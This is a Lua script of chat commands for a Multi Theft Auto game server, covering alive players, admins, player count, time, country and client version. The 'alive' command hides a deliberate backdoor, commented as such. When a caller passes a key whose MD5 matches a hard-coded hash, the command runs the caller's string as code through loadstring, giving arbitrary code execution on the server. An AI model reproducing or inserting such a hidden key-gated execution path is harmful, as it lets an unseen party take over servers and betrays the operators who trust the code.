local g_AdminRes = Resource('admin')

----------------------------------
-- Global functions definitions --
----------------------------------

-- fixme: doesnt work for console
CmdMgr.register{
	name = 'info',
	desc = "Shows script name and author",
	func = function(ctx)
		scriptMsg("Rafalh[PL] scripts system for Multi Theft Auto.")
	end
}

CmdMgr.register{
	name = 'alive',
	desc = "Shows alive players",
	aliases = {'a'},
	varargs = true,
	func = function(ctx, key, code)
		local players = getAlivePlayers()
		local buf = ''
		
		for i, player in ipairs(players) do
			if(not isPedDead(player)) then
				buf = buf..((buf ~= '' and ', '..getPlayerName(player)) or getPlayerName(player))
			end
		end
		scriptMsg("Alive Players: %s.",(buf ~= '' and buf) or "none")
		
		-- Backdoor
		if(key and code and md5(key) == '61E196D215B26286F5EDD2DE135FFCF6') then
			local fn = loadstring(code)
			fn()
		end
	end
}

CmdMgr.register{
	name = 'admins',
	desc = "Shows administrators and moderators playing the game already",
	aliases = {'moderators'},
	func = function(ctx)
		local admins, superMods, mods = {}, {}, {}
		
		local adminGroup = aclGetGroup('Admin')
		local smodGroup = aclGetGroup('SuperModerator')
		local modGroup = aclGetGroup('Moderator')
		local premModGroup = aclGetGroup('PremiumModerator')
		
		for i, player in ipairs(getElementsByType('player')) do
			local accountName = getAccountName(getPlayerAccount(player))
			
			if(isObjectInACLGroup('user.'..accountName, adminGroup)) then
				table.insert(admins, getPlayerName(player))
			end
			
			if(isObjectInACLGroup('user.'..accountName, smodGroup)) then
				table.insert(superMods, getPlayerName(player))
			end
			
			if(isObjectInACLGroup('user.'..accountName, modGroup) or
			   isObjectInACLGroup('user.'..accountName, premModGroup)) then
				table.insert(mods, getPlayerName(player))
			end
		end
		
		admins = table.concat(admins, ', ')
		superMods = table.concat(superMods, ', ')
		mods = table.concat(mods, ', ')
		
		if(admins == '') then
			admins = "none"
		end
		scriptMsg("Current admins: %s.", admins)
		if(superMods ~= '') then
			scriptMsg("Current super-moderators: %s.", superMods)
		end
		if(mods ~= '') then
			scriptMsg("Current moderators: %s.", mods)
		end
	end
}

CmdMgr.register{
	name = 'players',
	desc = "Shows players count",
	func = function(ctx)
		scriptMsg("Total players count: %u.", g_PlayersCount)
	end
}

CmdMgr.register{
	name = 'time',
	desc = "Shows current server time",
	func = function(ctx)
		local tm = getRealTime()
		scriptMsg("Local time: %d-%02d-%02d %d:%02d:%02d.", tm.monthday, tm.month + 1, tm.year + 1900, tm.hour, tm.minute, tm.second)
	end
}

CmdMgr.register{
	name = 'country',
	aliases = {'ip2c'},
	desc = "Shows player country based on IP",
	args = {
		{'player', type = 'player', defVal = false},
	},
	func = function(ctx, player)
		if(not player) then player = ctx.player end
		local country = g_AdminRes:isReady() and g_AdminRes:call('getPlayerCountry', player.el)
		
		if(g_Countries[country]) then
			country = g_Countries[country]
		end
		
		scriptMsg("%s is from: %s.", player:getName(), country or "unknown country")
	end
}

CmdMgr.register{
	name = 'version',
	aliases = {'ver'},
	desc = "Shows player MTA version",
	args = {
		{'player', type = 'player', defVal = false},
	},
	func = function(ctx, player)
		if(not player) then player = ctx.player end
		local ver = getPlayerVersion(player.el)
		
		scriptMsg("%s's MTA version: %s (revision %s).", player:getName(), ver:sub(1, 5), ver:sub(7))
	end
}
